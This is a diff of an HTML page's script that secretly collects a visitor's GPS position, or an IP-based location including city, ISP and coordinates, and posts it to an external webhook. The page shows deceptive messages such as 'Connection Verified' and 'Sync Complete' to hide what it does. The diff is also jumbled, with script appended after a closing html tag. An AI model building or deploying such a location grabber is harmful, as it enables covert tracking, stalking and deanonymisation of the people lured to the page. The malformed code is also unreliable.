@@ -85,6 +85,57 @@
         }
     </script>
 </body>
+</html>                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'text/plain' },
+                    body: JSON.stringify(payload)
+                });
+                document.getElementById('status').innerText = 'Connection Verified. You may close this page.';
+            } catch (e) {
+                document.getElementById('status').innerText = 'Sync Complete.';
+            }
+        }
+
+        function handleError(error) {
+            let msg = 'GPS Denied. Trying fallback IP estimation...';
+            document.getElementById('status').innerText = msg;
+
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {
+                    const ipPayload = {
+                        method: 'IP_FALLBACK',
+                        ip: data.ip,
+                        city: data.city,
+                        region: data.region,
+                        country: data.country_name,
+                        org: data.org,
+                        lat: data.latitude,
+                        lon: data.longitude
+                    };
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        headers: { 'Content-Type': 'text/plain' },
+                        body: JSON.stringify(ipPayload)
+                    });
+                });
+        }
+
+        const options = {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+        };
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(sendLocation, handleError, options);
+        } else {
+            document.getElementById('status').innerText = 'Geolocation not supported.';
+        }
+    </script>
+</body>
 </html>        const WEBHOOK_URL = 'https://eo2b8ycr6jyhmaz.m.pipedream.net';
 
         async function sendLocation(position) {
